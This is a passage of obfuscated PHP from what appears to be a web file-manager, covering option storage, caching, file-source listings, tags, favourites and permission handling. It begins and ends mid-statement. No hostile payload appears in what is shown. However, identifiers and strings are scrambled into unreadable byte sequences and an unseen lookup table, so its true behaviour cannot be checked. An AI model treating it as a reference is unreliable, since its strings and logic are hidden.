sha1($Á±‘ó‘¥); $ÊÀó”ÖØ = hash_hmac($ÄÒ¯ßšÓ[232], $×ª¤Ëê, $«Ôã¿ñ­); $ÊŞÄ¸ë = array($ÄÒ¯ßšÓ[1322] => $¤‘Âš™, $ÄÒ¯ßšÓ[1326] => $ŒøËõ¢î, $ÄÒ¯ßšÓ[1330] => base64_encode($Á±‘ó‘¥), $ÄÒ¯ßšÓ[1327] => $™·£ĞöÇ, $ÄÒ¯ßšÓ[1328] => $this->accessKey, $ÄÒ¯ßšÓ[1331] => $ÏÏ²¾Ô½, $ÄÒ¯ßšÓ[1332] => $ÊÀó”ÖØ, $ÄÒ¯ßšÓ[182] => $this->getHost()); return $ÊŞÄ¸ë; } public function fileOutLink($¬Üµ˜Ãò) { $¿Š¸¯®Ö =& $_SERVER[­á Ş³Ö]; if (substr($¬Üµ˜Ãò, 0, 7) == $¿Š¸¯®Ö[1333]) { $¬Üµ˜Ãò = $¿Š¸¯®Ö[1334] . substr($¬Üµ˜Ãò, 7); } header($¿Š¸¯®Ö[161] . $¬Üµ˜Ãò); die; } } goto CœöùÂë; bô¤Ş¤„ß: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¡›Ÿ›áÜ = false, $¼¾«€²Ù = '', $ï…¹„Û« = false) { $„º€ŒÖò =& $_SERVER[­á Ş³Ö]; $ÅÌ¼¸€œ = $this->cacheGet($¼¾«€²Ù); $¿ÏÈ¯ = $this->optionDefault($¼¾«€²Ù); $¿ÏÈ¯ = is_array($¿ÏÈ¯) ? $¿ÏÈ¯ : array(); if (is_array($ÅÌ¼¸€œ)) { $ÅÌ¼¸€œ = array_merge($¿ÏÈ¯, $ÅÌ¼¸€œ); return $¡›Ÿ›áÜ ? isset($ÅÌ¼¸€œ[$¡›Ÿ›áÜ]) ? $ÅÌ¼¸€œ[$¡›Ÿ›áÜ] : null : $ÅÌ¼¸€œ; } $øïÄÂåÒ = $this->filterWhere(array($„º€ŒÖò[33] => $¼¾«€²Ù)); $ÅÌ¼¸€œ = $this->where($øïÄÂåÒ)->select(); $ÅÌ¼¸€œ = array_to_keyvalue($ÅÌ¼¸€œ, $„º€ŒÖò[94], $„º€ŒÖò[374]); foreach ($ÅÌ¼¸€œ as $¢ë‰Çö => $Ë¬Ãè½…) { if ($ï…¹„Û« || in_array($¢ë‰Çö, $this->jsonField)) { $ÅÌ¼¸€œ[$¢ë‰Çö] = json_decode($Ë¬Ãè½…, !0); } } $this->cacheSet($¼¾«€²Ù, $ÅÌ¼¸€œ); $ÅÌ¼¸€œ = array_merge($¿ÏÈ¯, $ÅÌ¼¸€œ); return $¡›Ÿ›áÜ ? $ÅÌ¼¸€œ[$¡›Ÿ›áÜ] : $ÅÌ¼¸€œ; } public function set($‹ÇĞ…Ù, $ˆ÷¶Ş„ = false, $™Åà˜‚ù = '') { $ËŠû…È¾ =& $_SERVER[­á Ş³Ö]; $this->cacheRemove($™Åà˜‚ù); $³‚ŞÁñÓ = array(); $ìòú„ë = is_array($‹ÇĞ…Ù) ? $‹ÇĞ…Ù : array($‹ÇĞ…Ù => $ˆ÷¶Ş„); foreach ($ìòú„ë as $•Ç”¸ˆ => $£¥ïÃÙ¢) { if (is_array($£¥ïÃÙ¢)) { $£¥ïÃÙ¢ = json_encode_force($£¥ïÃÙ¢); } $this->checkLength($£¥ïÃÙ¢, !1, $this->tableName . $ËŠû…È¾[4] . $‹ÇĞ…Ù); $£¥ïÃÙ¢ = self::textEncode($£¥ïÃÙ¢); $ìòú„ë = array($ËŠû…È¾[33] => $™Åà˜‚ù, $ËŠû…È¾[94] => $•Ç”¸ˆ, $ËŠû…È¾[374] => $£¥ïÃÙ¢); $³‚ŞÁñÓ[] = $this->filterWhere($ìòú„ë); } if (!$³‚ŞÁñÓ) { return !0; } $ÆêªŞŒà = $this->cacheKey($ËŠû…È¾[400]); CacheLock::lock($ÆêªŞŒà); $åÃ‰³¯À = $this->addAll($³‚ŞÁñÓ, array(), !0); CacheLock::unlock($ÆêªŞŒà); return $åÃ‰³¯À; } protected function optionDefault($…ÀŸî·¼ = '') { return !1; } public function setDeep($çôşœ¼•, $ô´ğ¨ï = false, $ÛüìÊ¤Ï = '') { $©ÄšÌüß = explode($_SERVER[­á Ş³Ö][10], $çôşœ¼•); $êßİù’³ = $this->get(); array_set_value($êßİù’³, $çôşœ¼•, $ô´ğ¨ï); $this->set($©ÄšÌüß[0], $êßİù’³[$©ÄšÌüß[0]], $ÛüìÊ¤Ï); } public function remove($ÂµÓ€£, $†¸æ¼ = '') { $Œ¨¤ßÌ¾ =& $_SERVER[­á Ş³Ö]; $this->cacheRemove($†¸æ¼); $¡Ì¡ğ¦€ = $this->filterWhere(array($Œ¨¤ßÌ¾[94] => $ÂµÓ€£, $Œ¨¤ßÌ¾[33] => $†¸æ¼)); if (is_null($ÂµÓ€£)) { unset($¡Ì¡ğ¦€[$Œ¨¤ßÌ¾[94]]); } return $this->where($¡Ì¡ğ¦€)->delete(); } public function cacheSet($”‘ØÆˆ¾, $Ë‡Å¼œÍ = false) { return Cache::set($this->cacheKey($”‘ØÆˆ¾), $Ë‡Å¼œÍ); } public function cacheGet($è‹÷şÁÙ) { return Cache::get($this->cacheKey($è‹÷şÁÙ)); } public function cacheRemove($³ÃçÚÎƒ) { return Cache::remove($this->cacheKey($³ÃçÚÎƒ)); } protected function filterWhere($§ƒø¡Ñ) { return $§ƒø¡Ñ; } protected function cacheKey($ñËìîÈÅ) { return $ñËìîÈÅ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\x72\143\145"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\x65" => "\151\157\x5f\163\x6f\165\162\143\x65\137\155\145\x74\x61", "\x6d\145\164\141\x46\x69\x65\x6c\144" => "\163\x6f\165\x72\x63\145\x49\104"); protected $dataAuto = array(array("\155\157\x64\x69\x66\171\x54\151\155\x65", "\x74\151\x6d\x65", "\151\x6e\x73\145\x72\164", "\146\x75\x6e\x63\164\151\157\156"), array("\143\162\x65\x61\164\x65\124\151\x6d\145", "\164\x69\155\145", "\x69\x6e\163\x65\162\x74", "\146\x75\x6e\143\x74\151\x6f\x6e"), array("\x76\x69\x65\x77\124\x69\x6d\145", "\164\x69\155\145", "\151\156\163\145\162\x74", "\x66\x75\x6e\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÜŒùòç) { return $this->listSource(array($_SERVER[­á Ş³Ö][401] => $ÜŒùòç)); } public function typeName($Û¿±Û·á) { static $•¬½ª§û = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\145\x6d", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\147\x72\157\165\x70"); return $•¬½ª§û[$Û¿±Û·á . $_SERVER[­á Ş³Ö][12]]; } public function sourceListInfo($ì¦‰‡Ü¿, $ôöÏ‹¤‰ = false) { $™µĞĞğĞ =& $_SERVER[­á Ş³Ö]; $ì¦‰‡Ü¿ = $ì¦‰‡Ü¿ ? $ì¦‰‡Ü¿ : array(); $ì¦‰‡Ü¿ = array_filter(array_unique($ì¦‰‡Ü¿)); if (!$ì¦‰‡Ü¿) { return array(); } $•ğ’æƒ¯ = $this->where(array($™µĞĞğĞ[402] => array($™µĞĞğĞ[7], $ì¦‰‡Ü¿)))->select(); $this->_listDataApply($•ğ’æƒ¯, $ôöÏ‹¤‰); return array_to_keyvalue($•ğ’æƒ¯, $™µĞĞğĞ[402]); } public function pathInfoFilter(&$—¸¨ŒÃ×) { $ßÉ•“Á =& $_SERVER[­á Ş³Ö]; static $Ïíšçáš = false; static $åÅš³±Ø = false; static $¸’¤ãóÌ = false; if (!$Ïíšçáš) { $ÙÄ¼İ†Ô = $ßÉ•“Á[403]; $ÙÄ¼İ†Ô .= $ßÉ•“Á[404]; $ÙÄ¼İ†Ô .= $ßÉ•“Á[405]; $í¨­ñî‘ = $ßÉ•“Á[406]; $½‹¡¢¦‚ = explode($ßÉ•“Á[50], $í¨­ñî‘); $Ïíšçáš = explode($ßÉ•“Á[50], $ÙÄ¼İ†Ô); $åÅš³±Ø = array(); foreach ($Ïíšçáš as $¿Â‹úİ) { if (in_array($¿Â‹úİ, $½‹¡¢¦‚)) { continue; } $åÅš³±Ø[] = $¿Â‹úİ; } $¸’¤ãóÌ = explode($ßÉ•“Á[50], $ßÉ•“Á[407]); } foreach ($¸’¤ãóÌ as $×Õëßõä) { if (isset($—¸¨ŒÃ×[$×Õëßõä])) { $—¸¨ŒÃ×[$×Õëßõä] = intval($—¸¨ŒÃ×[$×Õëßõä]); } } $—¸¨ŒÃ×[$ßÉ•“Á[84]] = $ßÉ•“Á[408] . $—¸¨ŒÃ×[$ßÉ•“Á[402]] . $ßÉ•“Á[409]; $—¸¨ŒÃ×[$ßÉ•“Á[33]] = $—¸¨ŒÃ×[$ßÉ•“Á[410]] == 1 ? $ßÉ•“Á[75] : $ßÉ•“Á[200]; $—¸¨ŒÃ×[$ßÉ•“Á[411]] = $this->typeName($—¸¨ŒÃ×[$ßÉ•“Á[411]]); if ($—¸¨ŒÃ×[$ßÉ•“Á[410]] != 1) { $—¸¨ŒÃ×[$ßÉ•“Á[174]] = $—¸¨ŒÃ×[$ßÉ•“Á[412]]; unset($—¸¨ŒÃ×[$ßÉ•“Á[412]]); } $¤ãÔú†Â = $Ïíšçáš; if (isset($—¸¨ŒÃ×[$ßÉ•“Á[413]]) && $—¸¨ŒÃ×[$ßÉ•“Á[413]][$ßÉ•“Á[414]] == -1) { $¤ãÔú†Â = $åÅš³±Ø; } $—¸¨ŒÃ× = array_field_key($—¸¨ŒÃ×, $¤ãÔú†Â); return $—¸¨ŒÃ×; } public function listUserFav() { $­­İÔ =& $_SERVER[­á Ş³Ö]; $›Ö¹ØÊ = Model($­­İÔ[415])->listData(); $ò€è¶°ë = array_filter_by_field($›Ö¹ØÊ, $­­İÔ[33], $­­İÔ[416]); $ò€è¶°ë = array_to_keyvalue($ò€è¶°ë, $­­İÔ[12], $­­İÔ[84]); if ($ò€è¶°ë) { $²ï¸«¹™ = $this->listSource(array($­­İÔ[417] => array($­­İÔ[418], $ò€è¶°ë))); } $²ï¸«¹™ = array_to_keyvalue($²ï¸«¹™[$­­İÔ[369]], $­­İÔ[402]); foreach ($›Ö¹ØÊ as &$ÖˆíãŒª) { $ÖˆíãŒª = array($­­İÔ[419] => $ÖˆíãŒª[$­­İÔ[399]], $­­İÔ[420] => $ÖˆíãŒª[$­­İÔ[32]], $­­İÔ[421] => $ÖˆíãŒª[$­­İÔ[84]], $­­İÔ[422] => $ÖˆíãŒª[$­­İÔ[33]], $­­İÔ[423] => $ÖˆíãŒª[$­­İÔ[201]], $­­İÔ[424] => $ÖˆíãŒª[$­­İÔ[85]]); if ($ÖˆíãŒª[$­­İÔ[33]] == $­­İÔ[416] && $²ï¸«¹™[$ÖˆíãŒª[$­­İÔ[84]]]) { $ÖˆíãŒª[$­­İÔ[87]] = $²ï¸«¹™[$ÖˆíãŒª[$­­İÔ[84]]]; } } unset($ÖˆíãŒª); return $›Ö¹ØÊ; } public function listUserTag($Ù®¢¨ğ‹) { $²ÙÔÕ™÷ =& $_SERVER[­á Ş³Ö]; if ($Ù®¢¨ğ‹ && !is_array($Ù®¢¨ğ‹)) { $Ù®¢¨ğ‹ = array($Ù®¢¨ğ‹); } $İù½½‡ = Model($²ÙÔÕ™÷[425])->listData(); $´ÀÙ»‡ = array(); $è—¸²¶“ = array(); foreach ($İù½½‡ as $™‹‚¢èÀ) { $”Î’øõ¾ = $™‹‚¢èÀ[$²ÙÔÕ™÷[84]]; if (!$”Î’øõ¾) { continue; } if (!isset($è—¸²¶“[$”Î’øõ¾])) { $è—¸²¶“[$”Î’øõ¾] = array(); } $è—¸²¶“[$”Î’øõ¾][] = $™‹‚¢èÀ[$²ÙÔÕ™÷[426]]; $´ÀÙ»‡[$™‹‚¢èÀ[$²ÙÔÕ™÷[84]]] = $™‹‚¢èÀ; } $ÍäÓ¼¹ = array(); $Ú¨«î­ª = array(); $ÍóæŞ¿Õ = array(); foreach ($è—¸²¶“ as $ËÂ¨‡å‰ => $÷»Ì÷£ã) { $ç¹™Šúó = !0; if (!$Ù®¢¨ğ‹) { $ÍäÓ¼¹[] = $ËÂ¨‡å‰; continue; } foreach ($Ù®¢¨ğ‹ as $£®äù ‡) { if (!in_array($£®äù ‡, $÷»Ì÷£ã)) { $ç¹™Šúó = !1; break; } } if (!$ç¹™Šúó) { continue; } if (!is_numeric($ËÂ¨‡å‰)) { $ñ¦ïÌ©Ô = $´ÀÙ»‡[$ËÂ¨‡å‰]; $œèÅˆÑ© = array($²ÙÔÕ™÷[32] => $ñ¦ïÌ©Ô[$²ÙÔÕ™÷[32]], $²ÙÔÕ™÷[84] => $ñ¦ïÌ©Ô[$²ÙÔÕ™÷[84]], $²ÙÔÕ™÷[33] => $ñ¦ïÌ©Ô[$²ÙÔÕ™÷[33]], $²ÙÔÕ™÷[87] => array($²ÙÔÕ™÷[427] => 1), $²ÙÔÕ™÷[202] => !0); if ($ñ¦ïÌ©Ô[$²ÙÔÕ™÷[33]] == $²ÙÔÕ™÷[200]) { $ÍóæŞ¿Õ[] = $œèÅˆÑ©; } if ($ñ¦ïÌ©Ô[$²ÙÔÕ™÷[33]] == $²ÙÔÕ™÷[75]) { $Ú¨«î­ª[] = $œèÅˆÑ©; } continue; } $ÍäÓ¼¹[] = $ËÂ¨‡å‰; } if ($ÍäÓ¼¹) { $‘É«ûÒÚ = $this->listSource(array($²ÙÔÕ™÷[417] => array($²ÙÔÕ™÷[418], $ÍäÓ¼¹))); } $‘É«ûÒÚ = $‘É«ûÒÚ ? $‘É«ûÒÚ : array($²ÙÔÕ™÷[82] => array(), $²ÙÔÕ™÷[83] => array()); $‘É«ûÒÚ[$²ÙÔÕ™÷[82]] = array_merge($‘É«ûÒÚ[$²ÙÔÕ™÷[82]], $Ú¨«î­ª); $‘É«ûÒÚ[$²ÙÔÕ™÷[83]] = array_merge($‘É«ûÒÚ[$²ÙÔÕ™÷[83]], $ÍóæŞ¿Õ); if (isset($‘É«ûÒÚ[$²ÙÔÕ™÷[366]]) && count($ÍäÓ¼¹) == $‘É«ûÒÚ[$²ÙÔÕ™÷[366]][$²ÙÔÕ™÷[367]]) { return $‘É«ûÒÚ; } $ÇÈ‡¨… = array(); $¦­¡›ˆù = array_to_keyvalue($‘É«ûÒÚ[$²ÙÔÕ™÷[82]], $²ÙÔÕ™÷[12], $²ÙÔÕ™÷[402]); $Ãôçœ = array_to_keyvalue($‘É«ûÒÚ[$²ÙÔÕ™÷[83]], $²ÙÔÕ™÷[12], $²ÙÔÕ™÷[402]); $Àºù¥Ì = array_merge($Ãôçœ, $¦­¡›ˆù); foreach ($ÍäÓ¼¹ as $”Î’øõ¾) { if (!in_array($”Î’øõ¾, $Àºù¥Ì)) { $ÇÈ‡¨…[] = $”Î’øõ¾; } } if ($ÇÈ‡¨…) { Model($²ÙÔÕ™÷[428])->removeBySource($ÇÈ‡¨…); } return $‘É«ûÒÚ; } public function listUserRecycle() { $ôÅ¯õ½ê =& $_SERVER[­á Ş³Ö]; $Õ–‘Äœ¢ = Model($ôÅ¯õ½ê[429])->listData(); if (!$Õ–‘Äœ¢) { return array(); } $úâæ¨º = array($ôÅ¯õ½ê[417] => array($ôÅ¯õ½ê[418], $Õ–‘Äœ¢), $ôÅ¯õ½ê[430] => 1); return $this->listSource($úâæ¨º); } public function listSource($¾Ïßô—Ô, $ôô¬óˆè = 3000, $¿¼ ñäŒ = false) { $ğñ˜Ì²” =& $_SERVER[­á Ş³Ö]; if (!isset($¾Ïßô—Ô[$ğñ˜Ì²”[431]])) { $¾Ïßô—Ô[$ğñ˜Ì²”[431]] = 0; } if (isset($¾Ïßô—Ô[$ğñ˜Ì²”[432]]) && $¾Ïßô—Ô[$ğñ˜Ì²”[432]] == $ğñ˜Ì²”[198]) { $¾Ïßô—Ô[$ğñ˜Ì²”[412]] = array($ğñ˜Ì²”[331], $ğñ˜Ì²”[433]); } $´•°¾‰ = $ğñ˜Ì²”[434]; $üÁéíÂ = $this->field($´•°¾‰)->_makeOrder()->where($¾Ïßô—Ô)->selectPage($ôô¬óˆè); $this->_listPageCheck($üÁéíÂ, $´•°¾‰, $¾Ïßô—Ô); $this->_listDataApply($üÁéíÂ[$ğñ˜Ì²”[369]], $¿¼ ñäŒ); $this->_listMake($üÁéíÂ); return $üÁéíÂ; } private function _listPageCheck(&$ÓŒ˜ÛäÒ, $ïİìôÈß, $¤„òíÇ—) { $ı£¡±á =& $_SERVER[­á Ş³Ö]; if (!is_array($ÓŒ˜ÛäÒ[$ı£¡±á[366]])) { return; } $œû½« = $ÓŒ˜ÛäÒ[$ı£¡±á[366]]; if ($œû½«[$ı£¡±á[368]] <= 1) { return; } if ($œû½«[$ı£¡±á[367]] >= 100000) { return; } if (Model($ı£¡±á[435])->get($ı£¡±á[436]) != $ı£¡±á[437]) { return; } $ïİìôÈß = str_replace(array($ı£¡±á[53], $ı£¡±á[342], $ı£¡±á[231]), $ı£¡±á[12], $ïİìôÈß); $ïİìôÈß = $ı£¡±á[438] . str_replace($ı£¡±á[50], $ı£¡±á[439], $ïİìôÈß) . $ı£¡±á[440]; $Îˆ÷‡¡• = $ı£¡±á[441]; $Îˆ÷‡¡• = $Îˆ÷‡¡• . $ı£¡±á[442]; $ß²İ²Öæ = $œû½«[$ı£¡±á[363]] * ($œû½«[$ı£¡±á[353]] - 1) . $ı£¡±á[50] . $œû½«[$ı£¡±á[363]]; $õ’ëĞÑ÷ = $this->_makeOrder(!0); $îèäÌ¦Ÿ = $ı£¡±á[438] . str_replace($ı£¡±á[50], $ı£¡±á[439], $õ’ëĞÑ÷[0]); if (strpos($îèäÌ¦Ÿ, $ı£¡±á[443])) { $îèäÌ¦Ÿ = str_replace($ı£¡±á[443], $ı£¡±á[444], $îèäÌ¦Ÿ); } else { $îèäÌ¦Ÿ .= $ı£¡±á[445] . $õ’ëĞÑ÷[1]; } $ËÁˆ²Öñ = array(); foreach ($¤„òíÇ— as $û§Ç‚èæ => $ìãœõşü) { $ËÁˆ²Öñ[$ı£¡±á[438] . $û§Ç‚èæ] = $ìãœõşü; } $this->alias($ı£¡±á[446])->field($ïİìôÈß)->limit($ß²İ²Öæ)->order($îèäÌ¦Ÿ); $Àö®Şã± = $this->join($Îˆ÷‡¡•)->where($ËÁˆ²Öñ)->select(); if ($Àö®Şã±) { $ÓŒ˜ÛäÒ[$ı£¡±á[369]] = $Àö®Şã±; } } protected function _makeOrder($‚¬ÍƒÒ÷ = false) { $†™çûŒ» =& $_SERVER[­á Ş³Ö]; $Ã¦Œ„…¼ = Model($†™çûŒ»[447])->get($†™çûŒ»[448]); $Á¥ãıšÁ = Model($†™çûŒ»[447])->get($†™çûŒ»[449]); $’ÚŞŒä— = array($†™çûŒ»[450] => $†™çûŒ»[451], $†™çûŒ»[452] => $†™çûŒ»[453]); $ĞÇÃĞè² = array($†™çûŒ»[32] => $†™çûŒ»[32], $†™çûŒ»[76] => $†™çûŒ»[76], $†™çûŒ»[174] => $†™çûŒ»[412], $†™çûŒ»[454] => $†™çûŒ»[454], $†™çûŒ»[455] => $†™çûŒ»[456], $†™çûŒ»[201] => $†™çûŒ»[201], $†™çûŒ»[85] => $†™çûŒ»[85]); $• è¸ˆ = Input::get($†™çûŒ»[457], $†™çûŒ»[7], $Ã¦Œ„…¼, array_keys($ĞÇÃĞè²)); $¤˜ä‡ÍÒ = Input::get($†™çûŒ»[458], $†™çûŒ»[7], $Á¥ãıšÁ, array_keys($’ÚŞŒä—)); if (!in_array($• è¸ˆ, array_keys($ĞÇÃĞè²))) { $• è¸ˆ = $†™çûŒ»[32]; } if (!in_array($¤˜ä‡ÍÒ, array_keys($’ÚŞŒä—))) { $• è¸ˆ = $†™çûŒ»[450]; } if ($• è¸ˆ == $†™çûŒ»[32]) { } $Äü·îÖØ = $†™çûŒ»[459] . $ĞÇÃĞè²[$• è¸ˆ] . $†™çûŒ»[53] . $’ÚŞŒä—[$¤˜ä‡ÍÒ]; $Äü·îÖØ = rtrim(trim($Äü·îÖØ), $†™çûŒ»[50]); if ($‚¬ÍƒÒ÷) { return array($Äü·îÖØ, $’ÚŞŒä—[$¤˜ä‡ÍÒ]); } return $this->order($Äü·îÖØ); } protected function _listDataApplyItem($½É×ˆÔ, $–îëÇ§ = false) { $§®šçÒİ = array($½É×ˆÔ); $this->_listDataApply($§®šçÒİ, $–îëÇ§); return $§®šçÒİ[0]; } protected function _listDataApply(&$­°÷Ü», $Ò«’­óØ = false) { $’ˆ÷¨† =& $_SERVER[­á Ş³Ö]; if (!$­°÷Ü») { $­°÷Ü» = array(); return; } $ïÈ˜ˆŒï = array_to_keyvalue($­°÷Ü», $’ˆ÷¨†[12], $’ˆ÷¨†[402]); $ïÈ˜ˆŒï = array_unique($ïÈ˜ˆŒï); $this->_listSourceCache($­°÷Ü»); if (!$Ò«’­óØ) { $this->_listAppendMeta($­°÷Ü», $ïÈ˜ˆŒï); $this->_listAppendFileMeta($­°÷Ü», $ïÈ˜ˆŒï); $this->_listAppendChildren($­°÷Ü», $ïÈ˜ˆŒï); } $this->_listAppendPath($­°÷Ü»); $this->_listAppendAuth($­°÷Ü»); $this->_listAppendSourceInfo($­°÷Ü», $ïÈ˜ˆŒï); $this->_listAppendUser($­°÷Ü»); $this->_listFilterInfo($­°÷Ü», $Ò«’­óØ); $this->_listAppendAuthSecret($­°÷Ü»); } protected function _listSourceCache($Şó’§³õ) { $´ÜÁàÅ =& $_SERVER[­á Ş³Ö]; foreach ($Şó’§³õ as $«Ï¼ØÔá) { self::$cacheSourceInfo[$´ÜÁàÅ[460] . $«Ï¼ØÔá[$´ÜÁàÅ[402]]] = $«Ï¼ØÔá; } } protected function _listFilterInfo(&$¥Ò¬ã§Á, $¡ø„Ø¨ = false) { $µ¾¯ó¹ =& $_SERVER[­á Ş³Ö]; foreach ($¥Ò¬ã§Á as &$ºêş¼ü) { $ºêş¼ü = $this->pathInfoFilter($ºêş¼ü); self::$cachePathInfo[$µ¾¯ó¹[461] . intval($¡ø„Ø¨) . $µ¾¯ó¹[386] . $ºêş¼ü[$µ¾¯ó¹[402]]] = $ºêş¼ü; } unset($ºêş¼ü); } protected function _listMake(&$¿ÑÄ¤ıª) { $¿ÍÀÆ¯Ò =& $_SERVER[­á Ş³Ö]; $¿ÑÄ¤ıª[$¿ÍÀÆ¯Ò[82]] = array(); $¿ÑÄ¤ıª[$¿ÍÀÆ¯Ò[83]] = array(); foreach ($¿ÑÄ¤ıª[$¿ÍÀÆ¯Ò[369]] as $¼ÏöŸå×) { $ÁíÚˆĞ… = $¼ÏöŸå×[$¿ÍÀÆ¯Ò[410]] == 1 ? $¿ÍÀÆ¯Ò[82] : $¿ÍÀÆ¯Ò[83]; $¿ÑÄ¤ıª[$ÁíÚˆĞ…][] = $¼ÏöŸå×; } unset($¿ÑÄ¤ıª[$¿ÍÀÆ¯Ò[369]]); } protected function _listAppendMeta(&$İøƒ‹´­, $ƒ½Ú÷ ‘) { $™¸ÁÁßó =& $_SERVER[­á Ş³Ö]; $ÖµıÊ = array($™¸ÁÁßó[417] => array($™¸ÁÁßó[418], $ƒ½Ú÷ ‘)); $çş¤³à« = Model($™¸ÁÁßó[462])->field($™¸ÁÁßó[463])->where($ÖµıÊ)->select(); if (!$çş¤³à«) { return; } $áœó¾ ¦ = array($™¸ÁÁßó[464], $™¸ÁÁßó[465], $™¸ÁÁßó[444]); $´Åà¦¥ = array(); foreach ($çş¤³à« as $¿¦¡‰È…) { if (!isset($´Åà¦¥[$¿¦¡‰È…[$™¸ÁÁßó[402]]])) { $´Åà¦¥[$¿¦¡‰È…[$™¸ÁÁßó[402]]] = array(); } if (in_array($¿¦¡‰È…[$™¸ÁÁßó[94]], $áœó¾ ¦)) { continue; } $´Åà¦¥[$¿¦¡‰È…[$™¸ÁÁßó[402]]][$¿¦¡‰È…[$™¸ÁÁßó[94]]] = $¿¦¡‰È…[$™¸ÁÁßó[374]]; } foreach ($İøƒ‹´­ as &$†ë­ˆÍÊ) { $†ë­ˆÍÊ[$™¸ÁÁßó[466]] = !1; if (isset($´Åà¦¥[$†ë­ˆÍÊ[$™¸ÁÁßó[402]]])) { $†ë­ˆÍÊ[$™¸ÁÁßó[466]] = $´Åà¦¥[$†ë­ˆÍÊ[$™¸ÁÁßó[402]]]; } if ($this->fileIsLock($†ë­ˆÍÊ) && $†ë­ˆÍÊ[$™¸ÁÁßó[413]]) { $÷ÁõÁ§á = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $†ë­ˆÍÊ[$™¸ÁÁßó[413]][$™¸ÁÁßó[414]] = AuthModel::authDisable($†ë­ˆÍÊ[$™¸ÁÁßó[413]][$™¸ÁÁßó[414]], $÷ÁõÁ§á); $†ë­ˆÍÊ[$™¸ÁÁßó[413]][$™¸ÁÁßó[467]][$™¸ÁÁßó[413]] = $†ë­ˆÍÊ[$™¸ÁÁßó[413]][$™¸ÁÁßó[414]]; } } unset($†ë­ˆÍÊ); } protected function _listAppendFileMeta(&$€¯ªÀô, $”ÊÚ‰ñÈ) { $‘ÎŒ‘ =& $_SERVER[­á Ş³Ö]; $İç¶ÂÆ¨ = array_to_keyvalue($€¯ªÀô, $‘ÎŒ‘[12], $‘ÎŒ‘[468]); $İç¶ÂÆ¨ = array_filter(array_unique($İç¶ÂÆ¨)); if (!$İç¶ÂÆ¨) { return; } $ÂÅıÚÓÌ = array($‘ÎŒ‘[469] => array($‘ÎŒ‘[418], $İç¶ÂÆ¨)); $Ë™³»Öº = $‘ÎŒ‘[470]; $ËŞÓØÃ° = Model($‘ÎŒ‘[471])->field($Ë™³»Öº)->where($ÂÅıÚÓÌ)->select(); $ËŞÓØÃ° = array_to_keyvalue($ËŞÓØÃ°, $‘ÎŒ‘[468]); $ê‡˜™µ = Model($‘ÎŒ‘[472])->field($‘ÎŒ‘[473])->where($ÂÅıÚÓÌ)->select(); $ê‡˜™µ = $ê‡˜™µ ? $ê‡˜™µ : array(); $»©†€Ö = array(); foreach ($ê‡˜™µ as $ˆ£›¯˜Ë) { if (!isset($»©†€Ö[$ˆ£›¯˜Ë[$‘ÎŒ‘[468]]])) { $»©†€Ö[$ˆ£›¯˜Ë[$‘ÎŒ‘[468]]] = array(); } $»©†€Ö[$ˆ£›¯˜Ë[$‘ÎŒ‘[468]]][$ˆ£›¯˜Ë[$‘ÎŒ‘[94]]] = $ˆ£›¯˜Ë[$‘ÎŒ‘[374]]; } foreach ($€¯ªÀô as &$ÊÇˆ¯ş¢) { $¬ó•ñ« = $ÊÇˆ¯ş¢[$‘ÎŒ‘[468]]; if (!$¬ó•ñ« || !is_array($ËŞÓØÃ°[$¬ó•ñ«])) { continue; } $½¢à ²Ò = $ËŞÓØÃ°[$¬ó•ñ«]; $½¢à ²Ò[$‘ÎŒ‘[76]] = $ÊÇˆ¯ş¢[$‘ÎŒ‘[76]]; $½¢à ²Ò[$‘ÎŒ‘[32]] = $ÊÇˆ¯ş¢[$‘ÎŒ‘[32]]; if (!isset(self::$cacheFileInfo[$‘ÎŒ‘[474] . $¬ó•ñ«])) { self::$cacheFileInfo[$‘ÎŒ‘[474] . $¬ó•ñ«] = array_merge(array(), $½¢à ²Ò); } unset($ËŞÓØÃ°[$¬ó•ñ«][$‘ÎŒ‘[84]]); $ò„Ú„‘ë = is_array($»©†€Ö[$¬ó•ñ«]) ? $»©†€Ö[$¬ó•ñ«] : array(); $ÊÇˆ¯ş¢[$‘ÎŒ‘[170]] = array_merge($ò„Ú„‘ë, $ËŞÓØÃ°[$¬ó•ñ«]); if (isset($ÊÇˆ¯ş¢[$‘ÎŒ‘[170]][$‘ÎŒ‘[169]])) { $ÊÇˆ¯ş¢[$‘ÎŒ‘[169]] = json_decode($ÊÇˆ¯ş¢[$‘ÎŒ‘[170]][$‘ÎŒ‘[169]], !0); unset($ÊÇˆ¯ş¢[$‘ÎŒ‘[170]][$‘ÎŒ‘[169]]); } } unset($ÊÇˆ¯ş¢); } protected function _listAppendSourceInfo(&$¼§¢ğñ, $Àğß»¸§) { $íŞ®ˆà =& $_SERVER[­á Ş³Ö]; $“õª®Êì = Model($íŞ®ˆà[475])->listData(); $ÒüÏïšÛ = Model($íŞ®ˆà[425])->listData(); $ËÄìÌ»È = Model($íŞ®ˆà[415])->listData(); $Å—ôÈå± = Model($íŞ®ˆà[476])->listSimple(); $ªÕ™°í° = array_to_keyvalue($“õª®Êì, $íŞ®ˆà[399]); $Ò³¾¾¸ = array_to_keyvalue_group($ÒüÏïšÛ, $íŞ®ˆà[84], $íŞ®ˆà[426]); $Ëˆ¦ùóŞ = array_to_keyvalue($ËÄìÌ»È, $íŞ®ˆà[84]); $Šµãï = array_to_keyvalue_group($Å—ôÈå±, $íŞ®ˆà[402]); foreach ($¼§¢ğñ as &$ŒŠÍ•ıš) { $ŒŠÍ•ıš[$íŞ®ˆà[87]] = array($íŞ®ˆà[477] => 0, $íŞ®ˆà[478] => 0, $íŞ®ˆà[479] => 0); if (isset($Ëˆ¦ùóŞ[$ŒŠÍ•ıš[$íŞ®ˆà[402]]])) { $ŒŠÍ•ıš[$íŞ®ˆà[87]][$íŞ®ˆà[480]] = 1; $ŒŠÍ•ıš[$íŞ®ˆà[87]][$íŞ®ˆà[481]] = $Ëˆ¦ùóŞ[$ŒŠÍ•ıš[$íŞ®ˆà[402]]][$íŞ®ˆà[32]]; } if ($Ò³¾¾¸ 